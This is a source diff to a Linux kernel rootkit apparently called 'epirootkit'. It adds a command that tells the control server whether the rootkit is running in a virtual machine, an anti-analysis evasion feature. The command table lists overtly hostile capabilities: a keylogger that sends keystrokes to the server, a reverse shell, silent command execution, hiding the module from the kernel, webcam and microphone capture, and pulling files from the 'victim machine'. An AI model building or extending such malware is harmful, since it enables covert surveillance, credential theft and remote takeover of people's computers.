@@ -14,6 +14,7 @@
 #include "epirootkit.h"
 #include "menu.h"
 #include "passwd.h"
+#include "vanish.h"
 
 #define UPLOAD_BLOCK_SIZE 4096
 
@@ -40,29 +41,31 @@ static int play_audio_handler(char *args);
 static int get_file_handler(char *args);
 static int upload_handler(char *args);
 static int sysinfo_handler(char *args);
+static int is_in_vm_handler(char *args);
 
 static struct command rootkit_commands_array[] = {
-    { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
+    { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 51, connect_handler },
     { "disconnect", 10, "disconnect user", 15, disconnect_handler },
     { "ping", 4, "ping the rootkit", 16, ping_handler },
-    { "passwd", 6, "change rootkit password. Usage: passwd NEW_PASSWORD", 60, change_password_handler },
+    { "passwd", 6, "change rootkit password. Usage: passwd NEW_PASSWORD", 51, change_password_handler },
     { "exec", 4, "execute a shell command. Usage: exec [-s for silent mode] [args*]", 65, exec_handler },
-    { "klgon", 6, "activate keylogger", 20, klgon_handler },
-    { "klgoff", 7, "deactivate keylogger", 21, klgoff_handler },
-    { "klg", 3, "send keylogger content to server", 35, klg_handler },
+    { "klgon", 6, "activate keylogger", 18, klgon_handler },
+    { "klgoff", 7, "deactivate keylogger", 20, klgoff_handler },
+    { "klg", 3, "send keylogger content to server", 32, klg_handler },
     { "getshell", 8, "launch reverse shell", 20, getshell_handler },
-    { "killcom", 7, "exit the module", 16, killcom_handler },
-    { "hide_module", 11, "hide the module from the kernel", 34, hide_module_handler },
-    { "unhide_module", 13, "unhide the module in the kernel", 36, unhide_module_handler },
-    { "help", 4, "display this help message", 30, help_handler },
-    { "start_webcam", 11, "activate webcam", 20, start_webcam_handler },
-    { "capture_image", 13, "capture an image with the webcam", 50, capture_image_handler },
-    { "start_microphone", 15, "start recording from microphone", 40, start_microphone_handler },
-    { "play_audio", 10, "play an audio file", 40, play_audio_handler },
+    { "killcom", 7, "exit the module", 15, killcom_handler },
+    { "hide_module", 11, "hide the module from the kernel", 31, hide_module_handler },
+    { "unhide_module", 13, "unhide the module in the kernel", 31, unhide_module_handler },
+    { "help", 4, "display this help message", 25, help_handler },
+    { "start_webcam", 11, "activate webcam", 15, start_webcam_handler },
+    { "capture_image", 13, "capture an image with the webcam", 32, capture_image_handler },
+    { "start_microphone", 15, "start recording from microphone", 31, start_microphone_handler },
+    { "play_audio", 10, "play an audio file", 18, play_audio_handler },
     { "hooks", 5, "manage hide/forbid/alter rules", 30, hooks_menu_handler },
     { "get_file", 8, "download a file from victim machine", 35, get_file_handler },
-    { "upload", 6, "receive a file and save it on disk", 40, upload_handler },
-    { "sysinfo", 7, "get system information in JSON format", 40, sysinfo_handler },
+    { "upload", 6, "receive a file and save it on disk", 34, upload_handler },
+    { "sysinfo", 7, "get system information in JSON format", 37, sysinfo_handler },
+    { "is_in_vm", 8, "check if remote rootkit is running in vm", 40, is_in_vm_handler },
     { NULL, 0, NULL, 0, NULL }
 };
 
@@ -70,6 +73,18 @@ static struct command rootkit_commands_array[] = {
 static int get_file_handler(char *args) {
     (void)args;
     return 0;
+}
+
+static int is_in_vm_handler(char *args) {
+    (void)args;
+
+    if (is_running_in_virtual_env()) {
+        send_to_server("[YES] The rootkit is running in a virtual machine.\n");
+    } else {
+        send_to_server("[NOP] The rootkit is not running in a virtual machine.\n");
+    }
+
+    return SUCCESS;
 }
 
 static int help_handler(char *args) {
